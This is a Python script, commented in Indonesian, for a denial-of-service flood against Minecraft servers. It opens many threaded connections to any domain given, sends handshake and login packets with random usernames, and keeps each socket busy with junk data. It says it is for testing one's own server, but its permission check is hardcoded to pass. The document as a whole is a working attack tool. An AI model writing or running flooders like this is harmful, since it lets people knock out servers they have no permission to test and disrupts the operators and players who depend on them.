#!/usr/bin/env python3
"""
mc_premium_down.py – premium-handshake flood untuk testing server sendiri
usage: python3 mc_premium_down.py <your-domain> <port> <threads> <duration>
"""

import socket, ssl, threading, time, sys, dns.resolver, random, struct

# --- Konfigurasi legal ---
OWNER_CONFIRM = True  # Ubah ke True setelah Anda memiliki izin tertulis
if not OWNER_CONFIRM:
    print("❌ Anda belum menyetujui persyaratan hukum di atas.")
    sys.exit(1)

def resolve(host):
    try:
        return str(dns.resolver.resolve(host, 'A')[0])
    except Exception as e:
        print("[!] DNS gagal:", e)
        sys.exit(1)

def build_handshake(host):
    # VarInt (length) + VarInt (0x00) + VarInt (protocol) + VarInt (host_len) + host + Unsigned Short (port) + VarInt (next_state)
    protocol = 763  # 1.20.2
    host_bytes = host.encode('utf-8')
    packet = (
        b'\x00' +  # Packet ID = Handshake
        struct.pack('>I', protocol)[-3:] +  # VarInt protocol
        struct.pack('>I', len(host_bytes))[-1:] + host_bytes +
        struct.pack('>H', 25565) +
        b'\x02'  # Next state = Login
    )
    length = struct.pack('>I', len(packet))[-1:]
    return length + packet

def flood(ip, port, host):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            # Kirim handshake
            s.send(build_handshake(host))
            # Kirim login start (username random 16 char)
            username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=16))
            login_start = b'\x00' + struct.pack('>I', len(username))[-1:] + username.encode()
            login_len = struct.pack('>I', len(login_start))[-1:]
            s.send(login_len + login_start)
            # Biarkan koneksi terbuka & kirim junk setiap 1 detik
            while True:
                s.send(b'\x01\x00' * 1024)  # junk 2 kB
                time.sleep(1)
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 mc_premium_down.py <your-domain> 25565 <threads> <sec>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    ip = resolve(host)

    print(f"[+] Target  : {host}:{port} ({ip})")
    print(f"[+] Threads : {threads}")
    print(f"[+] Duration: {duration}s")

    start = time.time()
    for _ in range(threads):
        threading.Thread(target=flood, args=(ip, port, host), daemon=True).start()

    time.sleep(duration)
    print("[+] Test selesai.")